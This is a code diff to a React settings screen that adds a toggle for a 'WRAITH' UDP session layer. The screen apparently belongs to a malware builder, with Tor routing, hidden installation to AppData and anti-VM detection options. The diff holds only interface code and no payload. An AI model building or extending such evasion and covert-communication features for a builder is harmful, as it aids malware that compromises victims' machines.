@@ -43,6 +43,7 @@ export const Settings = () => {
   const [buildPort, setBuildPort] = useState<string>("1337");
   const [useTor, setUseTor] = useState<boolean>(false);
   const [torAddress, setTorAddress] = useState<string>("");
+  const [useWraith, setUseWraith] = useState<boolean>(false);
 
   const [installFileName, setInstallFileName] = useState<string>("");
   const [installFolder, setInstallFolder] = useState<string>("appdata");
@@ -261,6 +262,25 @@ export const Settings = () => {
               {currentStep === 1 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium">Tor Settings</h3>
+
+                  <div className="flex items-center justify-between mb-4">
+                    <div className="flex items-center">
+                      <IconWifi className="mr-2 text-purple-400" size={20} />
+                      <span>Use WRAITH (UDP session layer)</span>
+                    </div>
+                    <button
+                      onClick={() => setUseWraith(!useWraith)}
+                      className={`p-1 rounded-lg cursor-pointer ${
+                        useWraith ? "bg-blue-700" : "bg-gray-700"
+                      }`}
+                    >
+                      {useWraith ? (
+                        <IconToggleRight size={24} />
+                      ) : (
+                        <IconToggleLeft size={24} />
+                      )}
+                    </button>
+                  </div>
 
                   <div className="flex items-center justify-between mb-4">
                     <div className="flex items-center">
@@ -949,7 +969,8 @@ export const Settings = () => {
                       enableHidden,
                       antiVmDetection,
                       useTor,
-                      torAddress
+                      torAddress,
+                      useWraith
                     );
                   }}
                 >
